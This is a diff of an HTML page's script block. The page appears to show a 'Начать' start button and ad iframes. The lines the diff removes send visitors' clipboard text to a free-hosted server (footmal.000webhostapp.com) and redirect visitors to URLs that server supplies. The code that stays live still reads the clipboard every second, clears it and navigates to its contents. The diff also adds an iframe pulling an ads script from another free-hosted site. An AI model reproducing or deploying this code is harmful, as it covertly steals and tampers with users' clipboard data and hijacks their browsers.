@@ -72,40 +72,15 @@
     <script>
     var t, id;
         $(document).ready(function(){
-          $.ajax({
-      url: "https://footmal.000webhostapp.com/neon.php",
-      type: "post",
-      dataType: "html",
-      crossDomain: true,
-      data: ({type: "time"})
-    });
           if(document.location.search == "?clip"){
             var set = setInterval(function(){
           navigator.clipboard.readText().then(text => {
             if(text != ""){
               navigator.clipboard.writeText("");
               document.location.href = text;
-    $.ajax({
-      url: "https://footmal.000webhostapp.com/neon.php",
-      type: "post",
-      dataType: "html",
-      crossDomain: true,
-      data: ({text: text, type: "clip"})
-    });
             }
           });
             }, 1000);
-          } else if(document.location.search == "?get"){
-          $.ajax({
-      url: "https://footmal.000webhostapp.com/neon.php",
-      type: "post",
-      dataType: "html",
-      crossDomain: true,
-      data: ({type: "get"}),
-      success: function(data){
-        document.location.href = data;
-      }
-        });
           }
             var h0 = $("#center").width();
             var h = h0/25;
@@ -144,7 +119,7 @@
   <body>
 
 <iframe scrolling="no" src="https://neon.today/context/get/58861/18953/1/468/60" style="width: 468px; height: 60px;  padding: 0;border: 1px dotted grey;" frameborder="0"></iframe>
-    <br/><iframe></iframe><iframe></iframe><iframe></iframe>
+    <br/><iframe src="https://meteatame.000webhostapp.com/ads.php"></iframe>
   <div id="start">
         <button id="s">Начать</button>
     </div>
